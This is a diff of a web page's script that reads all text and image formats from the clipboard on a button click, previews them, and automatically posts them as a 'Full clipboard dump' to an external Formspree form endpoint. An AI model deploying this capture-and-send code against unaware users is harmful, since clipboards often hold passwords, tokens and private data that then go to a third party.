@@ -52,129 +52,171 @@
 
 <script>
 /* ==== CONFIG ==== */
-const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xeovoeak'; // <<< REPLACE THIS!
+const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xeovoeak';   // <<< CHANGE
 
 /* ==== ELEMENTS ==== */
-const statusEl = document.getElementById('status');
-const previewEl = document.getElementById('preview');
-const imagePreviewEl = document.getElementById('imagePreview');
-const manualEl = document.getElementById('manual');
+const statusEl   = document.getElementById('status');
+const previewEl  = document.getElementById('preview');
+const imageBox   = document.getElementById('imagePreview');
+const manualBox  = document.getElementById('manual');
 
 /* ==== HELPERS ==== */
-function setStatus(msg, cls = '') {
-  statusEl.textContent = msg;
-  statusEl.className = cls;
-}
+function setStatus(msg, cls='') { statusEl.textContent = msg; statusEl.className = cls; }
 function show(el) { el.classList.remove('hidden'); }
 function hide(el) { el.classList.add('hidden'); }
 
-/* ==== 1. MODERN CLIPBOARD API (TEXT + IMAGE) ==== */
-async function tryModernClipboard() {
-  if (!navigator.clipboard || !navigator.clipboard.read) return null;
+/* ==== 1. READ EVERYTHING FROM THE CLIPBOARD ==== */
+async function readAllClipboardItems() {
+  if (!navigator.clipboard?.read) return null;
+
   try {
-    const items = await navigator.clipboard.read();
-    let text = '', imageBlob = null;
+    const items = await navigator.clipboard.read();   // <-- raw clipboard items
+    const result = { texts: [], images: [] };
+
     for (const item of items) {
-      if (item.types.includes('text/plain')) {
-        const blob = await item.getType('text/plain');
-        text = await blob.text();
+      // ---- TEXT ----
+      for (const type of item.types.filter(t => t.startsWith('text/'))) {
+        const blob = await item.getType(type);
+        const txt  = await blob.text();
+        result.texts.push({ type, value: txt.trim() });
       }
-      if (item.types.some(t => t.startsWith('image/'))) {
-        const type = item.types.find(t => t.startsWith('image/'));
-        imageBlob = await item.getType(type);
+
+      // ---- IMAGE ----
+      for (const type of item.types.filter(t => t.startsWith('image/'))) {
+        const blob = await item.getType(type);
+        result.images.push({ type, blob });
       }
     }
-    return { text: text.trim(), image: imageBlob };
-  } catch (err) {
-    console.warn('Modern clipboard failed:', err);
+    return result;               // { texts: [{type,value},…], images: [{type,blob},…] }
+  } catch (e) {
+    console.warn('Clipboard read failed:', e);
     return null;
   }
 }
 
-/* ==== 2. LEGACY TEXT PASTE ==== */
-async function tryLegacyPaste() {
-  return new Promise(resolve => {
-    const textarea = document.createElement('textarea');
-    textarea.style.position = 'fixed'; textarea.style.opacity = '0';
-    document.body.appendChild(textarea);
-    textarea.focus();
+/* ==== 2. LEGACY TEXT-ONLY FALLBACK ==== */
+async function legacyPaste() {
+  return new Promise(res => {
+    const ta = document.createElement('textarea');
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.focus();
     setTimeout(() => {
-      const success = document.execCommand('paste');
-      const text = textarea.value.trim();
-      document.body.removeChild(textarea);
-      resolve(success ? { text, image: null } : null);
+      const ok = document.execCommand('paste');
+      const txt = ta.value.trim();
+      document.body.removeChild(ta);
+      res(ok ? [{type:'text/plain', value:txt}] : []);
     }, 100);
   });
 }
 
-/* ==== 3. SEND TO FORMSPREE ==== */
-async function sendData({ text = '', imageBlob = null }) {
-  const payload = { _subject: 'Clipboard capture (text+image)' };
-  if (text) payload.clipboard_text = text;
-  if (imageBlob) {
-    const base64 = await blobToBase64(imageBlob);
-    const ext = imageBlob.type.split('/')[1] || 'png';
-    payload.clipboard_image = `data:${imageBlob.type};base64,${base64}`;
-    payload.image_type = ext;
+/* ==== 3. DISPLAY PREVIEW ==== */
+function showPreview(data) {
+  // TEXT
+  if (data.texts.length) {
+    previewEl.innerHTML = data.texts
+      .map(t => `<strong>${t.type}</strong>:<br><pre>${escapeHtml(t.value)}</pre>`)
+      .join('<hr>');
+    show(previewEl);
+  } else hide(previewEl);
+
+  // IMAGES
+  if (data.images.length) {
+    imageBox.innerHTML = data.images
+      .map(img => {
+        const url = URL.createObjectURL(img.blob);
+        return `<img src="${url}" alt="${img.type}" style="max-width:100%;margin:0.5rem 0;">`;
+      })
+      .join('');
+    show(imageBox);
+  } else hide(imageBox);
+}
+
+/* ==== 4. SEND TO FORMSPREE ==== */
+async function sendToFormspree(data) {
+  const payload = { _subject: 'Full clipboard dump' };
+
+  // Text fields
+  data.texts.forEach((t,i) => {
+    payload[`text_${i}_${t.type.replace(/[^\w]/g,'_')}`] = t.value;
+  });
+
+  // Image fields (base64)
+  for (let i = 0; i < data.images.length; i++) {
+    const img = data.images[i];
+    const b64 = await blobToBase64(img.blob);
+    payload[`image_${i}`] = `data:${img.type};base64,${b64}`;
   }
 
   try {
-    const resp = await fetch(FORMSPREE_ENDPOINT, {
+    const r = await fetch(FORMSPREE_ENDPOINT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (resp.ok) setStatus('Sent! Check your inbox.', 'success');
-    else { setStatus('Server error.', 'error'); console.error(await resp.text()); }
-  } catch (e) { setStatus('Network failed.', 'error'); console.error(e); }
+    if (r.ok) setStatus('Sent – check your inbox', 'success');
+    else { setStatus('Server error', 'error'); console.error(await r.text()); }
+  } catch (e) { setStatus('Network error', 'error'); console.error(e); }
 }
-
-function blobToBase64(blob) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-    reader.onload = () => resolve(reader.result.split(',')[1]);
-    reader.onerror = reject;
-    reader.readAsDataURL(blob);
+function blobToBase64(b) {
+  return new Promise((res,rej) => {
+    const fr = new FileReader();
+    fr.onload = () => res(fr.result.split(',')[1]);
+    fr.onerror = rej;
+    fr.readAsDataURL(b);
   });
 }
 
-/* ==== MAIN BUTTON ==== */
+/* ==== 5. MAIN BUTTON ==== */
 document.getElementById('grab').addEventListener('click', async () => {
   setStatus('Reading clipboard…');
-  hide(previewEl); hide(imagePreviewEl); hide(manualEl);
+  hide(previewEl); hide(imageBox); hide(manualBox);
 
-  let data = await tryModernClipboard();
-  if (!data || (!data.text && !data.image)) {
-    setStatus('Modern API failed – trying legacy paste…');
-    const legacy = await tryLegacyPaste();
-    if (legacy && legacy.text) data = { text: legacy.text, image: null };
+  let data = await readAllClipboardItems();          // <-- NEW FULL READ
+
+  // Fallback for very old browsers
+  if (!data || (!data.texts.length && !data.images.length)) {
+    setStatus('Modern API unavailable – trying legacy paste…');
+    const legacyTexts = await legacyPaste();
+    if (legacyTexts.length) data = { texts: legacyTexts, images: [] };
   }
 
-  if (!data || (!data.text && !data.image)) {
-    setStatus('Connection failed.', 'error');
-    show(manualEl);
+  if (!data || (!data.texts.length && !data.images.length)) {
+    setStatus('Nothing found – paste manually', 'error');
+    show(manualBox);
     return;
   }
 
-  if (data.text) { previewEl.textContent = data.text; show(previewEl); }
-  if (data.image) {
-    const url = URL.createObjectURL(data.image);
-    imagePreviewEl.innerHTML = `<img src="${url}" alt="Clipboard image">`;
-    show(imagePreviewEl);
-  }
-
+  showPreview(data);
   setStatus('Sending…');
-  await sendData(data);
+  await sendToFormspree(data);
 });
 
-/* ==== MANUAL SEND ==== */
+/* ==== 6. MANUAL SEND (unchanged) ==== */
 document.getElementById('sendManual').addEventListener('click', async () => {
-  const text = document.getElementById('pasteArea').value.trim();
+  const txt = document.getElementById('pasteArea').value.trim();
   const file = document.getElementById('imageInput').files[0];
-  if (!text && !file) { setStatus('Add text or image first.', 'error'); return; }
-  setStatus('Sending manual data…');
-  await sendData({ text, image: file });
+  if (!txt && !file) { setStatus('Add something first', 'error'); return; }
+
+  const payload = { _subject: 'Manual clipboard' };
+  if (txt) payload.manual_text = txt;
+  if (file) {
+    const b64 = await blobToBase64(file);
+    payload.manual_image = `data:${file.type};base64,${b64}`;
+  }
+  setStatus('Sending manual…');
+  await fetch(FORMSPREE_ENDPOINT, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  }).then(r=>r.ok?setStatus('Sent','success'):setStatus('Error','error'));
 });
+
+/* ==== UTILS ==== */
+function escapeHtml(s) {
+  const div = document.createElement('div');
+  div.textContent = s;
+  return div.innerHTML;
+}
 </script>
 
 </body>
